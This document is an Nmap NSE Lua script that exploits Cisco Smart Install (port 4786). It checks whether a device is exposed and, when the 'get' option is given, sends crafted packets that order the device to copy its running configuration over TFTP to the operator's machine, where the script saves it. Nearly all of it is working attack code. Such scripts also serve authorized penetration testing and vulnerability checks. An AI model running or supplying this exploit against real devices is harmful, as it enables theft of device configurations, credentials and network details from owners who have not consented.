description = [[
Script attempts to see whether Cisco device allows us to download config
using smart install protocol (4786/tcp).
If script confirms that test is successfull and that user has passed get option,
script will start tftp server and issue commands to device to copy currently 
running config to us.

In case when we want to get config from the device, script will check if we are 
attacking public or private IP. if we are attacking public IP, it is required to 
provide public IP address to the script, as well as to create port forward rule on router. 

By default, without parameters, only test whether device is vulnerable or not.

Script is based on following GitHub repository: 
	https://github.com/Sab0tag3d/SIET

Other references:
* https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170214-smi
* https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160323-smi
]]

---
-- @usage nmap -p4786 --script cisco-siet <target_private_ip>
-- @usage nmap -p4786 --script --script-args "cisco-siet.get,cisco-siet.addr=<OUR_PUBLIC_IP>" <target_public_ip>
--
-- @args addr Public IP address if we are targeting public IP
-- @args get Switch to tell the script that we want to get config
--
-- @output
-- PORT     STATE SERVICE
-- 4786/tcp open  smart-install
-- | cisco-siet:
-- |   Host: 192.168.1.1.conf
-- |   Status: VULNERABLE
-- |_  File_Location: /tmp/192.168.1.1.conf
--
-- @xmloutput
-- <script id="cisco-siet" output="&#xa;  Host: 192.168.1.1&#xa;  Status: VULNERABLE">
-- <elem key="Host">192.168.1.1</elem>
-- <elem key="Status">VULNERABLE</elem>
-- <elem key="File_Location">/tmp/192.168.1.1.conf</elem>
-- </script>
---



author = "Erhad Husovic"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {'exploit','safe'}

local shortport = require "shortport"
local string = require "string"
local stdnse = require "stdnse"
local nmap = require "nmap"
local tftp = require "tftp"
local io = require "io"
local ipOps = require "ipOps"

portrule = shortport.version_port_or_service(4786,"smart-install","tcp",{"open","open|filtered"})

--- writes retrieved file to /tmp/<target>.conf file
function write_file(target,content)
  local filename = "/tmp/" .. target .. ".conf"
  stdnse.debug(1,'[*] Writing dumped config to %s',filename)
  local file = io.open(filename,"w")
  file:write(content)
  file:close()
end


--- obtaining ip address used to connect to the target, so that we can use that addr to tell device to whom to push config
--- done with creation of dummy connection just to obtain ip
function get_address(target)
  stdnse.debug(1,'[*] Getting interface address')
  local sock = nmap.new_socket("udp")
  local status, err = sock:connect(target,"66664","udp")
  if status then
    local status, address = sock:get_info()
    if not status then
      stdnse.verbose(1,"%s",err)
      stdnse.debug(1,'[-] Couldn\'t get socket info')
      return nil
    end
    for _, interface in pairs(nmap.list_interfaces()) do
      if interface.address == address then
        return interface.address
      end
    end
  else
    stdnse.debug(1, '[-] Couldn\'t connect to target on dummy port')
    return nil
  end
end


--- converting string to raw bytes
local function convert(data)
  local ret = ''
  for i = 1, #data, 2 do
    ret = ret .. string.char(tonumber(data:sub(i,i+1),16))
  end
  return ret
end


--- function that checks which IP address we use(private/public) and craft request to download config
--- if we use public ip address, script expects .addr attribute given to the script
local function get_config_request_create(target)
  local addr 
  if ipOps.isPrivate(target) then
    addr = get_address(target)
  else
    if not stdnse.get_script_args(SCRIPT_NAME .. ".addr") then
      stdnse.debug(1,'[-] Address is private and you didn\'t provide your public IP')
      return nil
    else
      addr = stdnse.get_script_args(SCRIPT_NAME .. ".addr")
    end
  end

  stdnse.debug(1,'[*] Using address %s\n',addr)

  local initial = '00000001000000010000000800000408000100140000000100000000fc99473786600000000303f4'
  local c1 = 'copy system:running-config flash:/config.text'
  local c2 = 'copy flash:/config.text tftp://' .. addr .. "/" .. target .. ".conf"
  local pkg 
  pkg = convert(initial) .. c1 .. convert(string.rep('00',336-#c1))
  pkg = pkg .. c2 .. convert(string.rep('00',672-#c2))
  return pkg
end

function test(host,port)
  stdnse.debug(1,'[*] Testing whether device is vulnerable or not')
  local output = stdnse.output_table()
  local timeout = stdnse.get_script_args(SCRIPT_NAME..".timeout") or 5000
  local get = stdnse.get_script_args(SCRIPT_NAME..".get")

  local data = convert("000000010000000100000004000000080000000100000000")
  local resp = convert("000000040000000000000003000000080000000100000000")

  local status, rec
  local host = host.ip or host.targetname
  output.Host = host
  local socket = nmap.new_socket("tcp")
  socket:set_timeout(5000)
  status = socket:connect(host,port)
  if status then
    socket:send(data)
    status,rec = socket:receive()
    if rec == resp then
      stdnse.debug(1,'[*] Host %s is vulnerable',host)
      output.Status = "VULNERABLE"
      if get then
        stdnse.debug(1,'[*] Getting config')
	data = get_config_request_create(host)
	if data then
	  tftp.start()
          socket:send(data)
	  stdnse.debug(1,'[*] Waiting for file...')
          local status, f = tftp.waitFile(host..'.conf',20)
          if status then
            write_file(host,f:getContent())
	    output.File_Location = '/tmp/' .. host .. '.conf'
	  else
            stdnse.debug(1,'[-] Error getting config file')
	  end
	end
      end
    else
      output.Status = "NOT VULNERABLE"
    end
  else
    stdnse.debug(1,'[-] Couldn\'t connect to port %s on %s',port,host)
  end
  return output
end

action = function(host,port)
  return test(host,port.number)
end
